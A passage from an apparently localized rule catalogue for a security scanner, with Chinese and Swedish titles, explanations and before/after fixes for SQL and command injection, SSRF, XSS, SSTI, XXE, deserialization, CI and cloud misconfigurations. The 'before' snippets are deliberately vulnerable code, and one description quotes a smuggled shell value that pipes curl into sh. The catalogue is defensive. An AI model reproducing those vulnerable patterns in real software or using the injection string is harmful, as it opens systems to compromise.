      after: `resource "google_project_iam_member" "admin" {\n  project = "my-project"\n  role    = "roles/storage.admin"  # 仅限真正需要的预定义角色，而不是 roles/owner\n  member  = "user:dev@example.com"\n}`,
    },
  },
  "azure-role-assignment-owner": {
    title: "Azure 角色分配授予了完全访问权限(Owner)",
    description:
      '一个 "azurerm_role_assignment" 分配了 "Owner" 角色——在整个被分配的作用域(订阅、资源组……)上拥有完全访问权限，包括控制其他用户的权限。这可能是为紧急账号特意设置的，但需要确认：日常使用中应只授予真正需要的、更具体的角色(例如单个资源组上的 "Contributor")。',
    fix: {
      before: `resource "azurerm_role_assignment" "example" {\n  scope                = data.azurerm_subscription.primary.id\n  role_definition_name = "Owner"\n}`,
      after: `resource "azurerm_role_assignment" "example" {\n  scope                = azurerm_resource_group.example.id\n  role_definition_name = "Contributor"  # 仅限真正需要的更具体角色，而不是整个订阅上的 Owner\n}`,
    },
  },
  "weak-random-token": {
    title: "安全令牌是用不具备密码学安全性的随机数生成器生成的",
    description:
      "一个名称类似 token/session/reset/otp/csrf 的值，使用 Math.random()(JS)、random.random()(Python)或 rand()(PHP)生成——这些生成器并非为安全性设计，其序列是可预测的。以这种方式生成的令牌可能被猜出或重构，从而使其存在的目的失效(例如一个任何人都能预测的密码重置链接)。",
    fix: {
      before: `const resetToken = Math.random().toString(36).slice(2);`,
      after: `const resetToken = crypto.randomBytes(32).toString("hex"); // crypto，而不是 Math.random —— 不可预测`,
    },
  },
  "ldap-injection": {
    title: "LDAP 过滤器是通过直接拼接请求值构建的",
    description:
      '构建 LDAP 过滤器的某一行代码(例如 "(uid=...)")直接包含了取自请求的值，没有对 LDAP 特殊字符做任何转义。控制该值的人可以篡改过滤器的逻辑——例如绕过身份验证检查，或读取本不该看到的目录数据。',
    fix: {
      before: `const filter = \`(uid=\${req.body.username})\`;\nclient.search(base, { filter });`,
      after: `const filter = \`(uid=\${ldapEscape(req.body.username)})\`; // 在过滤器中使用前，必须始终对 LDAP 特殊字符进行转义\nclient.search(base, { filter });`,
    },
  },
  "header-injection": {
    title: "一个请求值直接出现在 HTTP 响应头中",
    description:
      "一个 HTTP 响应头被设置为直接取自请求(query、body、params)的值，而不检查其中是否包含换行符(CRLF)。攻击者可以插入额外的响应头，甚至整个不同的响应——响应拆分(response splitting)——从而操纵缓存、cookie 或展示给其他用户的内容。",
    fix: {
      before: `res.setHeader("X-Redirect-Reason", req.query.reason)`,
      after: `const ALLOWED_REASONS = new Set(["expired", "manual"])\nres.setHeader("X-Redirect-Reason", ALLOWED_REASONS.has(req.query.reason) ? req.query.reason : "unknown")`,
    },
  },
  "gha-unpinned-action": {
    title: "CI 中的第三方 action 没有锁定到精确版本(commit SHA)",
    description:
      '工作流使用了通过标签或分支引用的第三方 action(例如 "@v1"、"@main")，而不是通过 commit SHA。维护者——或入侵其账号的人——可以随时把这个引用指向另一个 commit，悄无声息地改变 CI 中实际运行的内容，并能访问其密钥。commit SHA 则始终指向完全相同的代码。',
    fix: {
      before: `uses: some-org/some-action@v1`,
      after: `uses: some-org/some-action@a1b2c3d4e5f6...  # v1，锁定到该 commit SHA —— 更新版本时同步更新 SHA`,
    },
  },
  "gha-excessive-permissions": {
    title: "工作流授予自己全部令牌权限，而不只是实际使用的部分",
    description:
      '"permissions: write-all" 让工作流的 GITHUB_TOKEN 对一切拥有写入权限——issue、pull request、软件包、部署——即便工作流只用到其中一部分。如果工作流的某个步骤被攻破(恶意依赖、被注入的脚本)，这些更广的权限会扩大攻击者能做的事情。',
    fix: {
      before: `permissions: write-all`,
      after: `permissions:\n  contents: read\n  pull-requests: write  # 仅限工作流实际使用的权限`,
    },
  },
  "insecure-cookie-flags": {
    title: "会话或认证 cookie 在设置时没有 Secure 和 HttpOnly 标志",
    description:
      '一个名称类似 session/auth/token 的 cookie，在设置时的选项中没有 "httpOnly" 和 "secure"。没有 httpOnly，页面上的 JavaScript——包括通过 XSS 注入的代码——就能读取这个 cookie。没有 secure，它也可能通过未加密的 HTTP 连接被发送。',
    fix: {
      before: `res.cookie("session", sessionId)`,
      after: `res.cookie("session", sessionId, { httpOnly: true, secure: true, sameSite: "strict" })`,
    },
  },
  "vulnerable-dependency": (original) => ({
    title: original.title.replace("Dipendenza vulnerabile:", "易受攻击的依赖："),
    description: original.description,
    fix: {
      before: original.fix.before,
      after: original.fix.after.replace(
        "Nessuna versione corretta nota ancora — valuta un pacchetto alternativo o segui gli aggiornamenti del progetto.",
        "尚无已知的修复版本——可以考虑使用替代包，或关注项目的后续更新。"
      ),
    },
  }),
  "docker-missing-user": {
    title: "Dockerfile 没有设置非 root 用户",
    description:
      "Dockerfile 中没有 USER 指令：不指定的话，容器会以 root 身份运行。如果攻击者设法在容器内执行代码(例如利用某个存在漏洞的库)，容器内的 root 权限会让逃逸到宿主机、或对周边系统造成更大影响变得更容易。",
    fix: {
      before: `FROM node:20-slim\nWORKDIR /app\nCOPY . .\nCMD ["node", "server.js"]`,
      after: `FROM node:20-slim\nWORKDIR /app\nCOPY . .\nUSER node\nCMD ["node", "server.js"]`,
    },
  },
  "docker-unpinned-base-image": {
    title: '容器基础镜像使用了 ":latest" 标签',
    description:
      '一条 FROM 指令显式使用了 ":latest" 标签，而不是精确的版本号。"latest" 会随时间变化：同一个构建，在不同时间重新执行，可能得到不同版本的基础镜像——构建不可复现，而且不受欢迎的更新可能在没有任何人决定的情况下到来。',
    fix: {
      before: `FROM node:latest`,
      after: `FROM node:20.11-slim`,
    },
  },
  "docker-add-remote-url": {
    title: "Dockerfile 用 ADD 而不是 COPY 下载远程文件",
    description:
      "带有 http/https URL 的 ADD 指令会在构建过程中从互联网下载文件，既没有完整性校验，内容在仓库中也不可见。如果该 URL 将来被攻破，构建就会在没有人通过阅读 Dockerfile 察觉的情况下引入任意内容。",
    fix: {
      before: `ADD https://example.com/install.sh /tmp/install.sh`,
      after: `RUN curl -fsSL https://example.com/install.sh -o /tmp/install.sh \\\n    && echo "<预期哈希值>  /tmp/install.sh" | sha256sum -c -`,
    },
  },
  "k8s-run-as-root": {
    title: "Kubernetes 清单中的容器被设置为以 root 身份运行",
    description:
      'securityContext 中的 "runAsUser: 0" 或 "runAsNonRoot: false" 显式强制容器以 root 身份运行。如果攻击者设法在容器内执行代码(例如利用某个存在漏洞的库)，容器内的 root 权限会让逃逸到宿主机、或造成更大范围影响变得更容易。',
    fix: {
      before: `securityContext:\n  runAsUser: 0`,
      after: `securityContext:\n  runAsNonRoot: true\n  runAsUser: 1000`,
    },
  },
  "k8s-privilege-escalation": {
    title: "Kubernetes 清单中的容器可以获得超出初始权限的更多权限",
    description:
      'securityContext 中的 "allowPrivilegeEscalation: true" 允许容器内的进程获得比启动它的进程更高的权限(例如通过带有 setuid 位的二进制文件)。结合应用程序中的漏洞，这是朝着以超出预期权限执行代码迈出的又一步。',
    fix: {
      before: `securityContext:\n  allowPrivilegeEscalation: true`,
      after: `securityContext:\n  allowPrivilegeEscalation: false`,
    },
  },
  "k8s-host-namespace-access": {
    title: "Kubernetes 清单中的 pod 共享了宿主机的网络、进程或共享内存",
    description:
      '"hostNetwork"、"hostPID" 或 "hostIPC" 设为 true，会让 pod 脱离其正常的隔离：hostNetwork 会把 pod 暴露在宿主机网络上(绕过集群的网络策略)，hostPID 会让它看到宿主机上的所有进程，hostIPC 会让它访问宿主机的共享内存。普通应用几乎从不需要——通常只有底层系统/监控工具才会用到。',
    fix: {
      before: `spec:\n  hostNetwork: true`,
      after: `spec:\n  hostNetwork: false`,
    },
  },
  "k8s-missing-run-as-non-root": {
    title: "Kubernetes 清单没有显式强制以非 root 用户运行",
    description:
      '清单中(无论是 pod 级别还是单个容器级别)都没有 "runAsNonRoot"：不设置它的话，容器会以其镜像定义的用户运行——如果镜像本身没有改变这一点，往往默认就是 root。将其显式设为 true，会让 pod 在镜像仍试图以 root 运行时启动失败，而不是等到发生事故之后才发现。',
    fix: {
      before: `containers:\n  - name: app\n    image: myapp:1.0`,
      after: `containers:\n  - name: app\n    image: myapp:1.0\n    securityContext:\n      runAsNonRoot: true`,
    },
  },
},
  sv: {
  "supabase-service-role-in-client": {
    title: "Supabases hemliga nyckel hamnar i en fil avsedd för webbläsaren",
    description:
      "En variabel med ett offentligt prefix (t.ex. NEXT_PUBLIC_, VITE_) eller en klientsidig fil refererar till Supabases service role key. Denna nyckel kringgår Row Level Security: om den hamnar i webbläsarbunten kan vem som helst läsa den och agera som databasadministratör.",
    fix: {
      before: `// components/Dashboard.tsx\nconst supabase = createClient(url, process.env.NEXT_PUBLIC_SUPABASE_SERVICE_ROLE_KEY)`,
      after: `// app/api/admin/route.ts (endast server)\nconst supabase = createClient(url, process.env.SUPABASE_SERVICE_ROLE_KEY)`,
    },
  },
  "hardcoded-secret": {
    title: "Lösenord eller hemliga nycklar är skrivna direkt i koden",
    description:
      "En API-nyckel, en token eller ett lösenord verkar vara skrivet som ett bokstavligt värde istället för att läsas från en miljövariabel. Alla som läser källkoden (eller repot, om det är offentligt) får tag i den hemligheten.",
    fix: {
      before: `const apiKey = "sk_live_51H8x9K2eZvKYlo2C..."`,
      after: `const apiKey = process.env.STRIPE_SECRET_KEY`,
    },
  },
  "env-file-with-real-values": {
    title: "En fil med projektets riktiga lösenord finns bland de analyserade",
    description:
      "En .env-fil med riktiga värden (inte en .env.example) ingår i analysen. Om den här filen hamnar i ett repo eller en offentlig driftsättning blottas alla autentiseringsuppgifter den innehåller.",
    fix: {
      before: `# .env (sparad av misstag)\nDATABASE_URL=postgres://user:realpassword@db.host/prod`,
      after: `# .env.example (sparad)\nDATABASE_URL=postgres://user:password@localhost/dev\n\n# .env hålls utanför repot (.gitignore)`,
    },
  },
  "missing-row-level-security": {
    title: "Vem som helst kan läsa eller ändra alla användares data",
    description:
      "Row Level Security är avstängd, eller så tillåter en policy åtkomst för vem som helst (USING (true)) utan att kontrollera vem som gör förfrågan. Varje autentiserad användare — eller till och med en anonym — kan läsa eller ändra alla andras data.",
    fix: {
      before: `ALTER TABLE public.orders DISABLE ROW LEVEL SECURITY;`,
      after: `ALTER TABLE public.orders ENABLE ROW LEVEL SECURITY;\nCREATE POLICY "owners only" ON public.orders\n  USING (auth.uid() = user_id);`,
    },
  },
  "sql-injection": {
    title: "Ett värde som angetts av användaren klistras in direkt i en databasfråga",
    description:
      "En SQL-fråga byggs genom att konkatenera eller interpolera en sträng direkt istället för att använda parametrar. Om den texten kommer (även indirekt) från en användare kan den ändra själva frågan — SQL-injection.",
    fix: {
      before: "db.query(`SELECT * FROM users WHERE email = '${email}'`)",
      after: `db.query("SELECT * FROM users WHERE email = $1", [email])`,
    },
  },
  "plaintext-password-storage": {
    title: "Lösenord verkar inte vara skyddade",
    description:
      "Ett lösenordsfält sparas exakt som det kom in i förfrågan, och ingen hashfunktion (bcrypt, argon2, scrypt) förekommer i filen. Om databasen komprometteras är varje lösenord direkt användbart.",
    fix: {
      before: `await db.users.insert({ email, password: req.body.password })`,
      after: `const hashed = await bcrypt.hash(req.body.password, 12)\nawait db.users.insert({ email, password: hashed })`,
    },
  },
  "hardcoded-jwt-secret": {
    title: "Hemligheten som används för att signera inloggningar är skriven i klartext i koden",
    description:
      "Hemligheten som skickas till jwt.sign / jwt.verify (eller variabeln JWT_SECRET) är ett bokstavligt värde i koden istället för att komma från en miljövariabel. Den som läser den kan skapa giltiga åtkomsttoken för vilken användare som helst.",
    fix: {
      before: `jwt.sign(payload, "super-secret-key-123")`,
      after: `jwt.sign(payload, process.env.JWT_SECRET)`,
    },
  },
  "command-injection": {
    title: "Servern kan tvingas köra externa kommandon",
    description:
      "En funktion som kör systemkommandon (exec, execSync, spawn) tar emot en sträng byggd genom interpolation eller konkatenering. Om en del av den strängen kommer från användarinmatning kan den som kontrollerar den köra godtyckliga kommandon på servern.",
    fix: {
      before: "execSync(`convert ${filename} output.png`)",
      after: `execFile("convert", [filename, "output.png"])`,
    },
  },
  "unprotected-new-table": {
    title: "En ny tabell verkar skapas utan skydd",
    description:
      "En SQL-migration skapar en tabell men aktiverar inte Row Level Security för samma tabell i samma fil. Så länge det förblir så börjar tabellen utan någon begränsning på vem som kan läsa eller skriva till den.",
    fix: {
      before: `CREATE TABLE public.invoices (\n  id uuid PRIMARY KEY,\n  user_id uuid REFERENCES auth.users\n);`,
      after: `CREATE TABLE public.invoices (\n  id uuid PRIMARY KEY,\n  user_id uuid REFERENCES auth.users\n);\nALTER TABLE public.invoices ENABLE ROW LEVEL SECURITY;`,
    },
  },
  "permissive-cors": {
    title: "Webbplatsen accepterar förfrågningar från vilken annan webbplats som helst",
    description:
      "CORS-huvudet är satt till att acceptera förfrågningar från vilket ursprung som helst (*), eller så används cors()-middlewaren utan begränsningar. Vilken tredjepartswebbplats som helst kan anropa dina API:er från webbläsaren hos en redan autentiserad användare.",
    fix: {
      before: `app.use(cors())`,
      after: `app.use(cors({ origin: ["https://yoursite.com"] }))`,
    },
  },
  "admin-function-missing-auth": {
    title: "En funktion med administratörsbehörighet kontrollerar inte vem som använder den",
    description:
      "En route eller funktion vars namn antyder administratörsåtgärder innehåller, i de närliggande raderna, ingen autentiserings- eller rollkontroll. Vem som helst som känner till URL:en skulle kunna köra den.",
    fix: {
      before: `router.post("/admin/delete-user", async (req, res) => {\n  await db.users.delete(req.body.id)\n})`,
      after: `router.post("/admin/delete-user", requireAuth, requireRole("admin"), async (req, res) => {\n  await db.users.delete(req.body.id)\n})`,
    },
  },
  ssrf: {
    title: "Webbplatsen kan tvingas köra extern kod",
    description:
      "En utgående HTTP-förfrågan (fetch, axios) använder direkt ett värde från en användares förfrågan som mål-URL. En illvillig användare kan få din server att anropa interna eller godtyckliga adresser — Server-Side Request Forgery.",
    fix: {
      before: `const data = await fetch(req.query.url)`,
      after: `const ALLOWED = new Set(["https://api.yourservice.com"])\nif (!ALLOWED.has(req.query.url)) throw new Error("URL not allowed")\nconst data = await fetch(req.query.url)`,
    },
  },
  "weak-password-hashing": {
    title: "Lösenord skyddas med en metod som nu är lätt att knäcka",
    description:
      "På samma rad tillämpas md5() eller sha1() på ett värde kopplat till ett lösenord. Dessa algoritmer är för snabba att beräkna: en angripare med databasen kan prova miljarder lösenord per sekund.",
    fix: {
      before: `const hashed = crypto.createHash("md5").update(password).digest("hex")`,
      after: `const hashed = await bcrypt.hash(password, 12)`,
    },
  },
  "xss-dangerous-html": {
    title: "Text skriven av användare skulle kunna köra kod i webbläsaren",
    description:
      "Innehåll infogas på sidan som rå HTML (dangerouslySetInnerHTML, v-html, .innerHTML) istället för som vanlig text. Om det innehållet inkluderar användarinmatning kan det innehålla skript som körs i webbläsaren hos den som läser sidan.",
    fix: {
      before: `<div dangerouslySetInnerHTML={{ __html: comment.text }} />`,
      after: `<div>{comment.text}</div>\n// eller, om HTML behövs: DOMPurify.sanitize(comment.text)`,
    },
  },
  "public-storage-bucket": {
    title: "Utrymmet för uppladdade filer är synligt för alla",
    description:
      "En lagringsbucket (Supabase Storage, S3) är konfigurerad som offentlig. Om den innehåller dokument, foton eller filer uppladdade av användare kan vem som helst som känner till — eller gissar — sökvägen komma åt dem utan autentisering.",
    fix: {
      before: `supabase.storage.createBucket("uploads", { public: true })`,
      after: `supabase.storage.createBucket("uploads", { public: false })\n// servera filer med tidsbegränsade signerade URL:er: createSignedUrl(path, 60)`,
    },
  },
  "csrf-state-changing-get": {
    title: "En enda länk räcker för att radera eller ändra data",
    description:
      "En GET-route utför en åtgärd som ändrar data (sökvägen innehåller delete/remove/update/edit). GET-förfrågningar körs bara genom att besöka en länk eller ladda en bild från en extern sida — den klassiska startpunkten för en CSRF-attack.",
    fix: {
      before: `router.get("/posts/:id/delete", deletePost)`,
      after: `router.post("/posts/:id/delete", requireAuth, csrfProtection, deletePost)`,
    },
  },
  "insecure-token-storage": {
    title: "Inloggningsdata sparad i webbläsaren är inte väl skyddad",
    description:
      "En åtkomsttoken sparas i localStorage. Till skillnad från en httpOnly-cookie kan vilket skript som helst som körs på sidan (inklusive ett illvilligt som injicerats via XSS) läsa och stjäla den.",
    fix: {
      before: `localStorage.setItem("authToken", token)`,
      after: `// sätt token som en httpOnly-cookie från servern:\nres.cookie("authToken", token, { httpOnly: true, secure: true, sameSite: "strict" })`,
    },
  },
  "open-redirect": {
    title: "Webbplatsen kan användas för att omdirigera till en bedrägerisajt",
    description:
      "Webbplatsen omdirigerar användaren till en adress hämtad direkt från förfrågan (query, body, params) utan att kontrollera att det är en känd domän. En länk som verkar peka på din webbplats kan i själva verket leda till en nätfiskesida.",
    fix: {
      before: `res.redirect(req.query.next)`,
      after: `const ALLOWED = new Set(["/dashboard", "/profile"])\nres.redirect(ALLOWED.has(req.query.next) ? req.query.next : "/dashboard")`,
    },
  },
  idor: {
    title: "Att ändra en siffra i adressen skulle kunna visa någon annans data",
    description:
      "En databasfråga använder direkt en identifierare hämtad från URL:en (req.params.id) utan att i de närliggande raderna kontrollera att den tillhör användaren som gör förfrågan. Att ändra id:t i adressen skulle kunna ge åtkomst till en annan användares data — Insecure Direct Object Reference.",
    fix: {
      before: `const order = await Order.findById(req.params.id)`,
      after: `const order = await Order.findOne({ _id: req.params.id, userId: req.user.id })`,
    },
  },
  "no-login-rate-limit": {
    title: "Inloggningsformuläret blockerar inte för många försök i rad",
    description:
      "En inloggningsroute definieras i filen, men det finns inget spår av rate-limiting-middleware i samma fil. Utan en gräns för antal försök kan en angripare prova lösenord i följd (brute force) utan att saktas ner.",
    fix: {
      before: `router.post("/login", loginHandler)`,
      after: `import rateLimit from "express-rate-limit"\nconst loginLimiter = rateLimit({ windowMs: 15 * 60 * 1000, max: 5 })\nrouter.post("/login", loginLimiter, loginHandler)`,
    },
  },
  "sensitive-data-in-logs": {
    title: "Lösenord eller känslig data hamnar i loggar",
    description:
      "Ett anrop till console.log (eller liknande) inkluderar en variabel kallad password, token, secret eller apiKey. Om dessa loggar hamnar i en extern tjänst eller en fil förblir känslig data exponerad mycket längre än nödvändigt.",
    fix: {
      before: `console.log("login attempt", { email, password })`,
      after: `console.log("login attempt", { email })`,
    },
  },
  "path-traversal": {
    title: "En fil på servern kan läsas eller skrivas genom att välja sökvägen utifrån",
    description:
      "En funktion som läser, skriver eller skickar en fil hämtar sökvägen direkt från ett värde i förfrågan (query, body, params) utan att kontrollera att den stannar inom en tillåten mapp. En angripare kan infoga \"../\" för att lämna den avsedda mappen och läsa eller skriva över godtyckliga filer på servern (t.ex. en konfigurationsfil med autentiseringsuppgifter).",
    fix: {
      before: `app.get("/download", (req, res) => {\n  res.sendFile(req.query.file)\n})`,
      after: `const ALLOWED_DIR = path.resolve("./uploads")\napp.get("/download", (req, res) => {\n  const target = path.resolve(ALLOWED_DIR, req.query.file)\n  if (!target.startsWith(ALLOWED_DIR)) return res.status(400).send("Sökvägen är inte tillåten")\n  res.sendFile(target)\n})`,
    },
  },
  "nosql-injection": {
    title: "Ett värde angett av användaren körs som kod inuti en MongoDB-fråga",
    description:
      "MongoDBs $where-operator kör serversidig JavaScript för varje dokument — om den strängen byggs genom att konkatenera ett värde som kommer från användaren kan den som kontrollerar det få godtycklig kod att köras i databasens kontext, inte bara ändra filtret som vid en vanlig SQL-injection.",
    fix: {
      before: `db.collection.find({ $where: "this.username == '" + username + "'" })`,
      after: `db.collection.find({ username: username })`,
    },
  },
  ssti: {
    title: "Ett värde angett av användaren tolkas som en mall, inte som data",
    description:
      "En funktion som kompilerar/renderar en mall tar emot HELA mallen från ett värde i förfrågan, istället för att använda en fast mall och bara skicka data. En angripare kan skriva direkt i mallmotorns syntax (t.ex. {{7*7}} för Jinja2) och köra kod på servern — Server-Side Template Injection, som ofta leder till godtycklig kommandokörning, inte bara ett visningsproblem som XSS.",
    fix: {
      before: `return render_template_string(request.args.get("name"))`,
      after: `return render_template("profile.html", name=request.args.get("name"))`,
    },
  },
  xxe: {
    title: "XML-parsern kan tvingas läsa filer eller göra externa förfrågningar",
    description:
      "En XML-parser (DocumentBuilderFactory) skapas utan att uttryckligen inaktivera externa entiteter (DOCTYPE) i de närliggande raderna. Om parsern tar emot XML från en opålitlig källa kan en angripare definiera en extern entitet för att läsa filer på servern eller få den att kontakta en adress efter eget val — XML External Entity.",
    fix: {
      before: `DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();\nDocumentBuilder builder = factory.newDocumentBuilder();`,
      after: `DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();\nfactory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);\nDocumentBuilder builder = factory.newDocumentBuilder();`,
    },
  },
  "terraform-open-security-group": {
    title: "En Terraform-säkerhetsgrupp öppnar en känslig port mot hela internet",
    description:
      "En regel med \"cidr_blocks\" som inkluderar 0.0.0.0/0 (vilken IP-adress som helst) ligger nära en känslig port — SSH (22), RDP (3389), eller en typisk databasport (MySQL, Postgres, MongoDB, Redis, SQL Server). Vem som helst på internet kan försöka ansluta till den tjänsten, inte bara den som borde.",
    fix: {
      before: `ingress {\n  from_port   = 22\n  to_port     = 22\n  protocol    = "tcp"\n  cidr_blocks = ["0.0.0.0/0"]\n}`,
      after: `ingress {\n  from_port   = 22\n  to_port     = 22\n  protocol    = "tcp"\n  cidr_blocks = ["10.0.0.0/16"]  # endast ditt privata nätverk, eller en bastion host\n}`,
    },
  },
  "gcp-firewall-open-to-internet": {
    title: "En Google Cloud-brandväggsregel öppnar en känslig port mot hela internet",
    description:
      "En \"google_compute_firewall\"-resurs med \"source_ranges\" som inkluderar 0.0.0.0/0 (vilken IP-adress som helst) tillåter trafik till en känslig port — SSH (22), RDP (3389), eller en typisk databasport (MySQL, Postgres, MongoDB, Redis, SQL Server). Vem som helst på internet kan försöka ansluta till den tjänsten, inte bara den som borde.",
    fix: {
      before: `resource "google_compute_firewall" "allow-ssh" {\n  allow {\n    protocol = "tcp"\n    ports    = ["22"]\n  }\n  source_ranges = ["0.0.0.0/0"]\n}`,
      after: `resource "google_compute_firewall" "allow-ssh" {\n  allow {\n    protocol = "tcp"\n    ports    = ["22"]\n  }\n  source_ranges = ["10.0.0.0/16"]  # endast ditt privata nätverk, eller en bastion host\n}`,
    },
  },
  "azure-nsg-open-to-internet": {
    title: "En Azure-nätverksregel öppnar en känslig port mot hela internet",
    description:
      "En nätverkssäkerhetsregel (\"azurerm_network_security_rule\", eller ett \"security_rule\"-block inuti \"azurerm_network_security_group\") med \"source_address_prefix\" satt till \"*\" eller \"0.0.0.0/0\", riktning \"Inbound\" och åtkomst \"Allow\", nära en känslig port — SSH (22), RDP (3389), eller en typisk databasport. Vem som helst på internet kan försöka ansluta till den tjänsten, inte bara den som borde.",
    fix: {
      before: `resource "azurerm_network_security_rule" "allow-ssh" {\n  direction              = "Inbound"\n  access                 = "Allow"\n  destination_port_range = "22"\n  source_address_prefix  = "*"\n}`,
      after: `resource "azurerm_network_security_rule" "allow-ssh" {\n  direction              = "Inbound"\n  access                 = "Allow"\n  destination_port_range = "22"\n  source_address_prefix  = "10.0.0.0/16"  # endast ditt privata nätverk, eller en bastion host\n}`,
    },
  },
  "terraform-hardcoded-secret": {
    title: "En hemlighet är skriven som standardvärde för en Terraform-variabel",
    description:
      "En variabel med ett namn som password/secret/token/key har ett bokstavligt värde i sitt \"default\". Till skillnad från ett värde som skickas vid körning (tfvars, miljövariabler TF_VAR_*) hamnar ett default-värde i källkoden — och om repot delas eller är offentligt kan vem som helst se det, även utan åtkomst till Terraform-tillståndet.",
    fix: {
      before: `variable "db_password" {\n  default = "supersecret123"\n}`,
      after: `variable "db_password" {\n  # inget default: skicka det med en .tfvars-fil (utanför git) eller en miljövariabel TF_VAR_db_password\n  sensitive = true\n}`,
    },
  },
  "gha-script-injection": {
    title: "Ett värde kontrollerat av en extern användare går direkt in i ett skalkommando i CI",
    description:
      'Ett "run:"-kommando i ett GitHub Actions-workflow interpolerar direkt ett värde som en pull request-titel, ett grennamn eller en kommentars text — allt skrivbart av vem som helst som öppnar en pull request eller kommentar, även från en extern fork. Ett värde som `"; curl malware.sh | sh #` skulle köra godtyckliga kommandon i CI:n, med åtkomst till alla hemligheter tillgängliga i det workflowt.',
    fix: {
      before: `- run: echo "\${{ github.event.pull_request.title }}"`,
      after: `- env:\n    PR_TITLE: \${{ github.event.pull_request.title }}\n  run: echo "$PR_TITLE"  # skickas som en miljövariabel, aldrig interpolerad direkt i kommandot`,
    },
  },
  "gha-pull-request-target-checkout": {
    title: "Workflowt kör koden från en extern pull request med åtkomst till repots hemligheter",
    description:
      'Workflowt använder "pull_request_target" — som körs med bas-repots behörigheter och hemligheter även för en pull request öppnad från en orelaterad fork — och checkar ut pull requestens egen kod ("github.event.pull_request.head"), inte basgrenen. Den som öppnar pull requesten får i praktiken sin egen kod körd med åtkomst till de hemligheterna.',
    fix: {
      before: `on:\n  pull_request_target:\njobs:\n  build:\n    steps:\n      - uses: actions/checkout@v4\n        with:\n          ref: \${{ github.event.pull_request.head.sha }}`,
      after: `on:\n  pull_request_target:\njobs:\n  build:\n    steps:\n      # Checkar ut basgrenen, inte PR:ens kod — eller använd\n      # "pull_request" istället för "pull_request_target" om du inte\n      # behöver de bredare behörigheterna/hemligheterna.\n      - uses: actions/checkout@v4`,
    },
  },
  "insecure-deserialization": {
    title: "Data från förfrågan deserialiseras med ett format som kan köra kod",
    description:
      "pickle (Python), unserialize() (PHP), ObjectInputStream (Java), eller node-serialize-biblioteket (Node) deserialiserar ett värde hämtat direkt från förfrågan. Till skillnad från JSON kan dessa format representera och köra kod under själva deserialiseringen — den som kontrollerar det skickade värdet kan uppnå godtycklig kodkörning på servern.",
    fix: {
      before: `data = pickle.loads(request.data)`,
      after: `import json\ndata = json.loads(request.data)  # JSON kör aldrig kod vid parsning, till skillnad från pickle`,
    },
  },
  "jwt-none-algorithm": {
    title: 'Koden accepterar uttryckligen osignerade JWT-token (algoritmen "none")',
    description:
      '"none" förekommer bland algoritmerna som accepteras för att verifiera en JWT-token. En token med algoritmen "none" har ingen signatur att verifiera: vem som helst kan bygga en med vilket innehåll som helst (t.ex. en administratörsroll) och koden skulle acceptera den som giltig.',
    fix: {
      before: `jwt.verify(token, secret, { algorithms: ["HS256", "none"] })`,
      after: `jwt.verify(token, secret, { algorithms: ["HS256"] })  // inkludera aldrig "none" bland accepterade algoritmer`,
    },
  },
  "terraform-s3-block-public-access-disabled": {
    title: "Block Public Access är avstängt på en S3-bucket definierad i Terraform",
    description:
      'Ett eller flera av de fyra skydden i "aws_s3_bucket_public_access_block" (block_public_acls, ignore_public_acls, block_public_policy, restrict_public_buckets) är satta till false. Det betyder inte att bucketen redan är offentlig, men det tar bort ett skyddsnät som skulle förhindra att den görs offentlig av misstag i framtiden.',
    fix: {
      before: `resource "aws_s3_bucket_public_access_block" "example" {\n  block_public_acls = false\n}`,
      after: `resource "aws_s3_bucket_public_access_block" "example" {\n  block_public_acls       = true\n  ignore_public_acls      = true\n  block_public_policy     = true\n  restrict_public_buckets = true\n}`,
    },
  },
  "terraform-iam-wildcard-policy": {
    title: "En IAM-policy definierad i Terraform ger full åtkomst",
    description:
      'Ett statement med åtgärden "*" och resursen "*" ger full åtkomst till varje AWS-tjänst och resurs — samma kontroll som redan görs på det aktiva IAM-tillståndet, här läst direkt från koden innan den ens tillämpas. Det kan vara avsett för en nödroll, men bör bekräftas: för vardaglig användning, ge endast de behörigheter som faktiskt behövs.',
    fix: {
      before: `statement {\n  effect    = "Allow"\n  actions   = ["*"]\n  resources = ["*"]\n}`,
      after: `statement {\n  effect    = "Allow"\n  actions   = ["s3:GetObject"]\n  resources = ["arn:aws:s3:::din-bucket/*"]\n}`,
    },
  },
  "gcp-storage-bucket-public": {
    title: "En Google Cloud Storage-bucket görs läsbar för vem som helst",
    description:
      'En resurs av typen "google_storage_bucket_iam_member" eller "google_storage_bucket_iam_binding" ger en roll till "allUsers" eller "allAuthenticatedUsers" — den första gör bucketen läsbar för vem som helst på internet, även utan ett Google-konto; den andra för vem som helst med ett godtyckligt Google-konto, inte bara den som borde ha åtkomst.',
    fix: {
      before: `resource "google_storage_bucket_iam_member" "public" {\n  bucket = google_storage_bucket.example.name\n  role   = "roles/storage.objectViewer"\n  member = "allUsers"\n}`,
      after: `resource "google_storage_bucket_iam_member" "example" {\n  bucket = google_storage_bucket.example.name\n  role   = "roles/storage.objectViewer"\n  member = "user:someone@example.com"  # endast den som faktiskt ska ha åtkomst, inte allUsers/allAuthenticatedUsers\n}`,
    },
  },
  "azure-storage-public-access": {
    title: "Offentlig blob-åtkomst är aktiverad på ett Azure-lagringskonto",
    description:
      '"allow_blob_public_access" är satt till true på ett "azurerm_storage_account": vem som helst som känner till URL:en för en offentliggjord blob/container kan läsa den, utan någon autentisering.',
    fix: {
      before: `resource "azurerm_storage_account" "example" {\n  allow_blob_public_access = true\n}`,
      after: `resource "azurerm_storage_account" "example" {\n  allow_blob_public_access = false\n}`,
    },
  },
  "gcp-iam-overly-broad-role": {
    title: "En Google Cloud IAM-roll ger full åtkomst (Owner/Editor)",
    description:
      'En "google_project_iam_binding"/"google_project_iam_member" (eller motsvarande på organisations-/mappnivå) tilldelar den primitiva rollen "roles/owner" eller "roles/editor" — nästan fullständig åtkomst till varje tjänst i projektet. Det kan vara avsett för ett nödkonto, men bör bekräftas: för vardaglig användning, ge endast de mer specifika fördefinierade roller som faktiskt behövs.',
    fix: {
      before: `resource "google_project_iam_member" "admin" {\n  project = "my-project"\n  role    = "roles/owner"\n  member  = "user:dev@example.com"\n}`,
      after: `resource "google_project_iam_member" "admin" {\n  project = "my-project"\n  role    = "roles/storage.admin"  # endast den fördefinierade roll som faktiskt behövs, inte roles/owner\n  member  = "user:dev@example.com"\n}`,
    },
  },
  "azure-role-assignment-owner": {
    title: "En Azure-rolltilldelning ger full åtkomst (Owner)",
    description:
